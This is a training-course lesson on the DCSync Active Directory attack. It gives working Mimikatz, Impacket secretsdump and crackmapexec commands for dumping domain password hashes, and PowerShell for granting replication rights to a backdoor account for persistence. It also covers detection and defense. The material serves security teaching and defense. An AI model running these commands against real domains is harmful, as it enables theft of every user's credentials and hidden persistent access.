# DCSync Attack

## Unit 4 - Topic 6 | Credential Attacks

---

## Overview

**DCSync** abuses the Active Directory replication protocol to impersonate a domain controller and request password hashes for any user in the domain. It's one of the most powerful AD attacks — no malware on the DC, no file access needed, just network-based credential theft.

---

## 1. How DCSync Works

```
NORMAL DC REPLICATION:
┌──────┐    "Give me changes for user X"     ┌──────┐
│ DC1  │ ──────────────────────────────────→ │ DC2  │
│      │    (MS-DRSR / DRS Remote Protocol)  │      │
│      │                                     │      │
│      │    "Here's the data + password hash" │      │
│      │ ←────────────────────────────────── │      │
└──────┘                                     └──────┘

DCSYNC ATTACK:
┌──────────┐  "Give me changes for krbtgt"   ┌──────┐
│ Attacker │ ──────────────────────────────→ │  DC  │
│ (pretends│  (DRS replication request)      │      │
│  to be   │                                 │      │
│  a DC!)  │  "Here's krbtgt's hash"         │      │
│          │ ←────────────────────────────── │      │
└──────────┘  DC thinks it's replicating!    └──────┘

REQUIRED PERMISSIONS:
├── DS-Replication-Get-Changes
├── DS-Replication-Get-Changes-All
└── (Optionally) DS-Replication-Get-Changes-In-Filtered-Set

WHO HAS THESE BY DEFAULT:
├── Domain Admins
├── Enterprise Admins
├── Domain Controllers (machine accounts)
└── Anyone explicitly granted these rights
```

---

## 2. Performing DCSync

```bash
# === MIMIKATZ (Windows) ===
# DCSync specific user:
lsadump::dcsync /user:corp\Administrator
lsadump::dcsync /user:corp\krbtgt
lsadump::dcsync /user:corp\svc_sql

# DCSync all users:
lsadump::dcsync /all /csv

# Output includes:
# - SAM Account Name
# - NTLM hash
# - LM hash (if stored)
# - Password history hashes
# - Kerberos keys (AES-256, AES-128, DES)

# === IMPACKET secretsdump.py (Linux — Preferred) ===
# DCSync all hashes:
secretsdump.py corp.local/admin:pass@dc01 -just-dc
# Output: username:RID:LM_HASH:NTLM_HASH:::

# DCSync specific user:
secretsdump.py corp.local/admin:pass@dc01 \
  -just-dc-user krbtgt

# With NTLM hash (PtH):
secretsdump.py corp.local/admin@dc01 \
  -hashes :NTLM_HASH -just-dc

# With Kerberos ticket:
export KRB5CCNAME=admin.ccache
secretsdump.py corp.local/admin@dc01 \
  -k -no-pass -just-dc

# === CRACKMAPEXEC ===
crackmapexec smb dc01 -u admin -p pass --ntds
# Dumps entire NTDS.dit via DCSync
# Output saved to ~/.cme/logs/
```

---

## 3. Finding DCSync-Capable Accounts

```powershell
# === WHO CAN DCSYNC? ===
# PowerView:
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" \
  -SearchScope Base -ResolveGUIDs | \
  Where-Object {
    ($_.ObjectAceType -match 'Repl') -and
    ($_.ActiveDirectoryRights -match 'ExtendedRight')
  } | select SecurityIdentifier, ObjectAceType

# Convert SIDs to names:
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" \
  -SearchScope Base -ResolveGUIDs | \
  Where-Object {$_.ObjectAceType -match 'Repl'} | \
  ForEach-Object {
    $_ | Add-Member -NotePropertyName 'IdentityName' \
      -NotePropertyValue (Convert-SidToName $_.SecurityIdentifier) -PassThru
  } | select IdentityName, ObjectAceType

# BloodHound:
# Pre-built query: "Find Principals with DCSync Rights"

# AD Module:
(Get-Acl "AD:DC=corp,DC=local").Access | \
  Where-Object {$_.ObjectType -match '1131f6a'} | \
  select IdentityReference, ObjectType
# 1131f6aa = DS-Replication-Get-Changes
# 1131f6ad = DS-Replication-Get-Changes-All
```

---

## 4. Granting DCSync Rights (Persistence)

```bash
# === ADD DCSYNC RIGHTS TO A USER ===
# If you have DA/WriteDACL on domain object:

# PowerView:
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity backdoor_user \
  -Rights DCSync

# AD Module:
$acl = Get-Acl "AD:DC=corp,DC=local"
$user = New-Object System.Security.Principal.NTAccount("corp\backdoor_user")
# Add DS-Replication-Get-Changes:
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,"ExtendedRight","Allow",[GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
# Add DS-Replication-Get-Changes-All:
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,"ExtendedRight","Allow",[GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl "AD:DC=corp,DC=local" $acl

# Now backdoor_user can DCSync without being Domain Admin!
# This is a stealthy persistence mechanism
```

---

## 5. Detection and Defense

```
DETECTING DCSYNC:

EVENT LOGS:
├── Event ID 4662: Operation on an AD object
│   ├── Properties: {1131f6aa-...} = Replication rights used
│   ├── Account Name: Who performed DCSync
│   └── Alert if: Non-DC account uses replication rights!
│
├── Event ID 4624: Logon event (associated with DCSync)
│   └── Check source IP — should be a known DC IP
│
└── Network Detection:
    ├── Monitor for DRS traffic from non-DC IPs
    ├── IDS signatures for MS-DRSR protocol
    └── Zeek/Suricata can detect replication traffic

DEFENSE:
├── Minimize accounts with DCSync rights
├── Monitor Event ID 4662 for replication access
├── Alert on non-DC sources performing replication
├── Use Protected Users group (limits credential exposure)
├── Audit domain object ACLs regularly
└── Remove unnecessary DCSync permissions
```

| Defense | Implementation |
|---------|---------------|
| **Audit ACLs** | Regularly check who has Repl rights |
| **Monitor 4662** | Alert on replication by non-DC accounts |
| **Network monitor** | Detect DRS protocol from non-DC IPs |
| **Minimize DAs** | Fewer DAs = fewer DCSync-capable accounts |
| **Credential Guard** | Prevent hash extraction on endpoints |
| **Admin tiering** | DA accounts only used on DCs |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **DCSync** | Replication protocol abuse to dump all hashes |
| **Required rights** | DS-Replication-Get-Changes(-All) |
| **Key targets** | krbtgt (Golden Ticket), Administrator, all users |
| **Tool (Windows)** | Mimikatz lsadump::dcsync |
| **Tool (Linux)** | secretsdump.py -just-dc |
| **Detection** | Event ID 4662 + non-DC source IP |
| **Persistence** | Grant DCSync rights to backdoor user |

---

## Quick Revision Questions

1. **What Active Directory protocol does DCSync abuse?**
2. **What specific permissions are required for DCSync?**
3. **Why is the krbtgt hash the top DCSync target?**
4. **How can you detect DCSync attacks in event logs?**
5. **How can DCSync rights be used for persistence?**

---

[← Previous: Silver and Golden Tickets](05-silver-and-golden-tickets.md)

---

*Unit 4 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Privilege Escalation in AD →](../05-Privilege-Escalation-in-AD/01-local-privilege-escalation.md)*
